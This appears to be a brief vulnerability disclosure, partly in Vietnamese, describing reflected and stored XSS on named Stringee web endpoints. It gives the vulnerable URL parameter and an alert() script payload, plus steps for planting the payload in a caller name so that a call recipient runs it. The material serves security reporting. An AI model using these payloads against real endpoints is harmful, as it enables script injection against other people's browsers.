# Reflected XSS + Stored XSS




## Reflected XSS 

Endpoint : https://static.stringee.com/button-call/lastest/videocall/popup_voicecall.html?from_number=[xss]

Inject : ```<script>alert(1)</script>```

![](https://raw.githubusercontent.com/VHAE04/Report_web_security_vulnerabilities/main/Stringee/image/Reflected_XSS.jpg)


## Stored XSS

Url : https://developer.stringee.com/report/call

Inject : ```<script>alert(1)</script>```

Tạo một access_token từ url để thực hiện cuộc gọi 

thay đổi tên người cuộc gọi = `inject `

==> người nhận(victim) bị xss

Endpoint : 

```
https://static.stringee.com/button-call/lastest/videocall/popup_voicecall.html
?from_number=[xss]
&to_number=84936423493
&call_type=free-voice-call
&access_token=[secret]
&hotline=[victim]

```

Inject : ```<script>alert(1)</script>```

![](https://github.com/VHAE04/Report_web_security_vulnerabilities/blob/main/Stringee/image/Stored_XSS.png?raw=true)
